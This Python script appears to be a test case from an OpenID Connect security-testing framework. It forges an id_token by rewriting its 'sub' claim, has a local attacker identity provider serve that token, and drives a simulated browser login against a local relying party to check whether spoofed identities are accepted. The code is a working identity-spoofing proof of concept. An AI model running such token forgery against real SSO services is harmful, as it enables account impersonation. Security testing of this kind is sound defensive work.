import sys
import os
import time

sys.path.append(os.path.join(os.path.dirname(__file__), '../../src'))

from browser import BrowserSimulator
from attacker_idp import AttackerIdPClient
import id_token

ATTACKER_IDP_ENDPOINT = "http://localhost:9997"
HONEST_RP_ENDPOINT = "http://localhost:9999"
PROXY_SERVER_ENDPOINT = "http://localhost:8080"

attakcer_idp_client = AttackerIdPClient(ATTACKER_IDP_ENDPOINT)
simulator = BrowserSimulator(f'{HONEST_RP_ENDPOINT}/login', PROXY_SERVER_ENDPOINT)

try:
    # create malicious id_token
    original_id_token = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImtleXN0b3JlLUNIQU5HRS1NRSJ9.eyJzdWIiOiJob2dlIiwiYXRfaGFzaCI6InBqZ3FVZ25yb0x0RldGSDFKMHBncFEiLCJhdWQiOiJjbGllbnQiLCJleHAiOjE2ODc1OTk3MDgsImlhdCI6MTY4NzU5NjEwOCwiaXNzIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwIn0.tzdJYBUuTs4q-pU8pCEm3mUp4DbXZfihrZbA4M_nKQryl9S3q7bvYaj8c-dFLidGiQXSKhMX8s1WE9rNolSmPosvyBYZiRjMWDEFK8NWY4MPZ882jNy64gk-ShwZC_x2fsZ3emobQjaRrtVu3YozmE9pbPvLX8U3l46zMogQqKJfvGCHIS1lmxs4iVEnlUDHn36m4_35SrzPF5a_jry_RUpmx9_CsryzdDGM6VzovmID0PZqeSoJ9MQJbkn5oEfG70XoykAATxQsmA-HHkmfo8WbqZko1xYwzFvi8ig-K6D33Tod-KMInt9wMYpPHPmv4lZchLeZSOVgTCbwp003Bw"
    malicious_id_token = id_token.replace_payload(original_id_token, {"sub": "huga"})

    # add task to attacker idp
    name = 'IDSpoofing'
    args = {
        'id_token': malicious_id_token
    }
    task_id = attakcer_idp_client.add_task(name, args)
    print(task_id)

    time.sleep(5)

    # victim credentials
    victim_username = 'test-user@localhost'
    victim_password = 'verysecure'

    # browser simulation
    sso_flow = f"""
page.locator('input[name="username"]').fill('{victim_username}')
page.locator('input[name="password"]').fill('{victim_password}')
page.locator('button[type="submit"]').click()
print(page.content())
    """
    
    simulator.run(sso_flow)
    simulator.close()

    attakcer_idp_client.delete_task()
except Exception as e:
    print('Error:', e)
    attakcer_idp_client.delete_task()
